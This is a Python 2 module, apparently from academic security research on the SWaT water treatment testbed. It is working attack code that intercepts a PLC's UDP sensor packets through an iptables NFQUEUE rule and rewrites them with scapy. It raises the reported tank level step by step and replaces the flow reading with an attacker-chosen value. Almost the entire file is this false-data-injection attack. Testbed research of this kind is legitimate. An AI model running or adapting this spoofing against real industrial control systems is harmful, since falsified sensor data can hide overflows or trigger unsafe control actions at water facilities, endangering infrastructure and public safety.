#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 David I. Urbina, UTD
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Secure Water Testbed (SWaT) Singapore University of Technology and Design.
SWATAttack module to spoof water level and flow in PLC 1.
"""
from __future__ import print_function
from netfilterqueue import NetfilterQueue
import os

from scapy.layers.inet import IP
from scapy.layers.inet import UDP

import swat
import filters
import scaling


# Parameters list
flow = 0
sflow = 0
level = 0
_init = True


def __spoof(packet):
    pkt = IP(packet.get_payload())
    if swat.SWAT_P1_RIO_AI in pkt:
        global _init, level
        if _init:
            level = pkt[swat.SWAT_P1_RIO_AI].level
            _init = False
        level += 5
        pkt[swat.SWAT_P1_RIO_AI].level = level
        pkt[swat.SWAT_P1_RIO_AI].flow = flow
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    packet.accept()


def start():
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __spoof)
    try:
        print("[*] starting water level and flow spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        print("[*] stopping water level and flow spoofing")
        nfqueue.unbind()


def configure():
    global sflow, flow
    sflow = input('Set level (m^2/h): ')
    flow = filters.reverse_scale(sflow, scaling.P1Flow)
    params()


def params():
    print('Flow: {} m^2/h ({})'.format(sflow, flow))


def __setup():
    os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')


def __setdown():
    os.system('sudo iptables -t mangle -D PREROUTING -p udp --dport 2222 -j NFQUEUE')
